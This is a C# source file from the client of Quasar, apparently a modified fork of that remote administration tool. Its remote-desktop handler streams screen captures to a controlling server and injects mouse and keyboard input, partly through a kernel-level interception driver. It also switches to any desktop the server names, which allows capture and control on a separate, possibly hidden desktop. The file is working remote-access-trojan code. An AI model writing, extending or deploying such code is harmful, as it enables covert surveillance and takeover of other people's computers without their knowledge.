using Quasar.Client.Helper;
using Quasar.Common.Enums;
using Quasar.Common.Messages;
using Quasar.Common.Networking;
using Quasar.Common.Video;
using Quasar.Common.Video.Codecs;
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Windows.Forms;

using InputInterceptorNS;
using Quasar.Client.Interception;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using NAudio.Utils;
using Quasar.Client.Networking;

namespace Quasar.Client.Messages
{
    public class RemoteDesktopHandler : NotificationMessageProcessor, IDisposable
    {


        // Import the necessary functions from user32.dll


        [DllImport("user32.dll")]
        private static extern bool CloseDesktop(IntPtr hDesktop);

        [DllImport("user32.dll")]
        private static extern bool SetThreadDesktop(IntPtr hDesktop);

        [DllImport("user32.dll")]
        private static extern IntPtr GetThreadDesktop(uint dwThreadId);

        [DllImport("kernel32.dll")]
        private static extern uint GetCurrentThreadId();

        [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr OpenDesktop(string lpszDesktop, uint dwFlags, bool fInherit, uint dwDesiredAccess);

        private const uint DESKTOP_READOBJECTS = 0x0001;
        private const uint GENERIC_ALL = 0x10000000;

        private UnsafeStreamCodec _streamCodec;

        public override bool CanExecute(IMessage message) => message is GetDesktop ||
                                                             message is DoMouseEvent ||
                                                             message is DoKeyboardEvent ||
                                                             message is GetMonitors;

        public override bool CanExecuteFrom(ISender sender) => true;

        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetDesktop msg:
                    Execute(sender, msg);
                    break;
                case DoMouseEvent msg:
                    Execute(sender, msg);
                    break;
                case DoKeyboardEvent msg:
                    Execute(sender, msg);
                    break;
                case GetMonitors msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, GetDesktop message)
        {
            try
            {
                Networking.Client clientRef = (Networking.Client)client;
                if (message.DesktopName != clientRef.curDesktopName)
                {
                    if (clientRef.curDesktop.ToInt64() != 0L)
                    {
                        CloseDesktop(clientRef.curDesktop);
                    }
                    IntPtr hDesktop = OpenDesktop(message.DesktopName, 0U, false, GENERIC_ALL);
                    if (hDesktop != IntPtr.Zero)
                    {
                        clientRef.curDesktop = hDesktop;
                        clientRef.curDesktopName = message.DesktopName;
                        client.Send(new NotifyMessageToServer { Message = $"Desktop is changed to {message.DesktopName}" });
                    }
                    else return;
                }
                if(clientRef.curDesktop != IntPtr.Zero) SetThreadDesktop(clientRef.curDesktop);
            }
            catch (Exception ex)
            {
                client.Send(new NotifyMessageToServer { Message = "Thread Dekstop Change Error: " + ex.Message });
            }


            // TODO: Switch to streaming mode without request-response once switched from windows forms
            // TODO: Capture mouse in frames: https://stackoverflow.com/questions/6750056/how-to-capture-the-screen-and-mouse-pointer-using-windows-apis
            var monitorBounds = ScreenHelper.GetBounds((message.DisplayIndex));
            var resolution = new Resolution { Height = monitorBounds.Height, Width = monitorBounds.Width };

            if (_streamCodec == null)
                _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);

            if (message.CreateNew)
            {
                _streamCodec?.Dispose();
                _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
                OnReport("Remote desktop session started");                
            }

            if (_streamCodec.ImageQuality != message.Quality || _streamCodec.Monitor != message.DisplayIndex || _streamCodec.Resolution != resolution)
            {
                _streamCodec?.Dispose();

                _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
            }

            BitmapData desktopData = null;
            Bitmap desktop = null;
            try
            {
                desktop = ScreenHelper.CaptureScreen(message.DisplayIndex);
                desktopData = desktop.LockBits(new Rectangle(0, 0, desktop.Width, desktop.Height),
                    ImageLockMode.ReadWrite, desktop.PixelFormat);

                using (MemoryStream stream = new MemoryStream())
                {
                    if (_streamCodec == null) throw new Exception("StreamCodec can not be null.");
                    _streamCodec.CodeImage(desktopData.Scan0,
                        new Rectangle(0, 0, desktop.Width, desktop.Height),
                        new Size(desktop.Width, desktop.Height),
                        desktop.PixelFormat, stream);
                    client.Send(new GetDesktopResponse
                    {
                        Image = stream.ToArray(),
                        Quality = _streamCodec.ImageQuality,
                        Monitor = _streamCodec.Monitor,
                        Resolution = _streamCodec.Resolution
                    });
                }
            }
            catch (Exception ex)
            {
                if (_streamCodec != null)
                {
                    client.Send(new GetDesktopResponse
                    {
                        Image = null,
                        Quality = _streamCodec.ImageQuality,
                        Monitor = _streamCodec.Monitor,
                        Resolution = _streamCodec.Resolution
                    });
                }

                client.Send(new NotifyMessageToServer { Message = "Exception while screen cpaturing: " + ex.Message });
                _streamCodec = null;
            }
            finally
            {
                if (desktop != null)
                {
                    if (desktopData != null)
                    {
                        try
                        {
                            desktop.UnlockBits(desktopData);
                        }
                        catch
                        {
                        }
                    }
                    desktop.Dispose();
                }
            }
        }

        private void Execute(ISender sender, DoMouseEvent message)
        {
            try
            {
                Screen[] allScreens = Screen.AllScreens;
                int offsetX = allScreens[message.MonitorIndex].Bounds.X;
                int offsetY = allScreens[message.MonitorIndex].Bounds.Y;
                Point p = new Point(message.X + offsetX, message.Y + offsetY);

                // Disable screensaver if active before input
                switch (message.Action)
                {
                    case MouseAction.LeftDown:
                    case MouseAction.LeftUp:
                    case MouseAction.RightDown:
                    case MouseAction.RightUp:
                    case MouseAction.MoveCursor:
                        if (NativeMethodsHelper.IsScreensaverActive())
                            NativeMethodsHelper.DisableScreensaver();
                        break;
                }

                if (message.mode == RemoteDesktopMode.Normal)
                {
                    switch (message.Action)
                    {
                        case MouseAction.LeftDown:
                        case MouseAction.LeftUp:
                            NativeMethodsHelper.DoMouseLeftClick(p, message.IsMouseDown);
                            break;
                        case MouseAction.RightDown:
                        case MouseAction.RightUp:
                            NativeMethodsHelper.DoMouseRightClick(p, message.IsMouseDown);
                            break;
                        case MouseAction.MoveCursor:
                            NativeMethodsHelper.DoMouseMove(p);
                            break;
                        case MouseAction.ScrollDown:
                            NativeMethodsHelper.DoMouseScroll(p, true);
                            break;
                        case MouseAction.ScrollUp:
                            NativeMethodsHelper.DoMouseScroll(p, false);
                            break;
                    }
                }
                else
                {
                    switch (message.Action)
                    {
                        case MouseAction.LeftDown:
                        case MouseAction.LeftUp:
                            InterceptionHelper.KernelDoMouseLeftClick(p, message.IsMouseDown);
                            break;
                        case MouseAction.RightDown:
                        case MouseAction.RightUp:
                            InterceptionHelper.KernelDoMouseRightClick(p, message.IsMouseDown);
                            break;
                        case MouseAction.MoveCursor:
                            InterceptionHelper.KernelDoMouseMove(p);
                            break;
                        case MouseAction.ScrollDown:
                            InterceptionHelper.KernelDoMouseScroll(p, true);
                            break;
                        case MouseAction.ScrollUp:
                            InterceptionHelper.KernelDoMouseScroll(p, false);
                            break;
                    }
                }
            }
            catch
            {
            }
        }

        private void Execute(ISender sender, DoKeyboardEvent message)
        {
            if (NativeMethodsHelper.IsScreensaverActive())
                NativeMethodsHelper.DisableScreensaver();

            if(message.mode == RemoteDesktopMode.Normal)
                NativeMethodsHelper.DoKeyPress(message.Key, message.KeyDown);
            else
                InterceptionHelper.KenelKeyPress(message.Key, message.KeyDown);
        }

        private void Execute(ISender client, GetMonitors message)
        {
            client.Send(new GetMonitorsResponse {Number = Screen.AllScreens.Length});
        }

        /// <summary>
        /// Disposes all managed and unmanaged resources associated with this message processor.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                _streamCodec?.Dispose();
            }
        }
    }
}
